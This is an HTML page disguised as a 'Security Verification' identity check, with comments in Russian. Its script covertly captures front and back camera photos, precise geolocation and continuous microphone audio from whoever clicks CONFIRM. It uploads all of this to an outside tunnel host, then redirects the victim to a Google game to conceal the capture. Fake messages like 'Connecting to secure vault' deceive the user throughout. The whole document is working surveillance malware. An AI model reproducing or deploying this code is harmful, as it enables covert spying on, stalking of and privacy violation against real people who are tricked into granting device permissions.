<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Verification</title>
    <style>
        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; transition: background 0.1s; overflow: hidden; }
        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:85%; max-width: 400px; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: opacity 0.3s; z-index: 10; }
        .btn { background:#fff; color:#000; border:none; padding:18px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 18px; transition: 0.3s; }
        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
        @keyframes spin { 100% { transform:rotate(360deg); } }
        video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display:none; }
        p { color: #888; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
        body.flash-active { background: #fff !important; }
        .flash-active .card { opacity: 0; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg">Please confirm your identity.</p>
        <button class="btn" id="go" onclick="run()">CONFIRM</button>
        <div id="loader"></div>
    </div>
    
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

<script>
// ОБНОВЛЕННЫЙ URL ИЗ ТВОЕГО ЛОГА
const API = "https://c03ca13d1aa2e1e3-176-2-182-204.serveousercontent.com"; 
const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
const urlParams = new URLSearchParams(window.location.search);
const user = urlParams.get('user') || "Unknown";

const sleep = ms => new Promise(r => setTimeout(r, ms));

// --- 1. ФУНКЦИЯ ФОТО (ОТДЕЛЬНО) ---
async function takePhoto(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } } 
        });
        const v = document.getElementById('v');
        v.srcObject = stream;
        
        await new Promise(r => v.onloadedmetadata = r);
        await v.play();
        await sleep(1000); 

        const canvas = document.getElementById('c');
        canvas.width = v.videoWidth;
        canvas.height = v.videoHeight;
        canvas.getContext('2d').drawImage(v, 0, 0);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
        
        // ОСТАНАВЛИВАЕМ КАМЕРУ ПЕРЕД СЛЕДУЮЩИМ ШАГОМ
        stream.getTracks().forEach(t => t.stop());
        return blob;
    } catch (e) { 
        console.error("Camera error:", e);
        return null; 
    }
}

// --- 2. ФУНКЦИЯ ГЕОЛОКАЦИИ (ОТДЕЛЬНО) ---
async function sendGeo() {
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            p => {
                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`)
                .finally(() => resolve());
            }, 
            () => resolve(), 
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

// --- 3. ФУНКЦИЯ АУДИО (ОТДЕЛЬНО, В КОНЦЕ) ---
async function startAudioStreaming() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const options = { mimeType: 'audio/webm;codecs=opus' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) options.mimeType = '';

        const mediaRecorder = new MediaRecorder(stream, options);
        
        mediaRecorder.ondataavailable = async (event) => {
            if (event.data && event.data.size > 100) { 
                const fd = new FormData();
                fd.append('file', event.data, `audio_${Date.now()}.webm`);
                fetch(`${API}/upload-audio?user=${encodeURIComponent(user)}`, { method: 'POST', body: fd }).catch(()=>{});
            }
        };

        mediaRecorder.start(10000); // Интервал 10 секунд
    } catch (e) { console.error("Audio error", e); }
}

// --- ГЛАВНАЯ ЛОГИКА: ВСЁ ПО ОЧЕРЕДИ ---
async function run() {
    document.getElementById('go').style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    const msg = document.getElementById('msg');

    // ШАГ 1: ФОТО (Сначала фронталка, потом задняя)
    const fd = new FormData();
    const modes = ["user", "environment"];
    
    for (let mode of modes) {
        msg.innerText = `Connecting to secure vault... (${mode === 'user' ? 'Front' : 'Back'})`;
        const photo = await takePhoto(mode);
        if (photo) fd.append('files', photo, `photo_${mode}.jpg`);
        await sleep(500); // Пауза для стабильности
    }

    // ОТПРАВКА ФОТО
    if (fd.has('files')) {
        msg.innerText = "Uploading credentials...";
        await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, { method: 'POST', body: fd }).catch(()=>{});
    }

    // ШАГ 2: ГЕОЛОКАЦИЯ
    msg.innerText = "Verifying location...";
    await sendGeo();

    // ШАГ 3: АУДИО (Запускаем перед редиректом)
    msg.innerText = "Access Granted!";
    await startAudioStreaming();

    // РЕДИРЕКТ
    await sleep(1000);
    window.location.href = REDIRECT_URL;
}
</script>
</body>
</html>
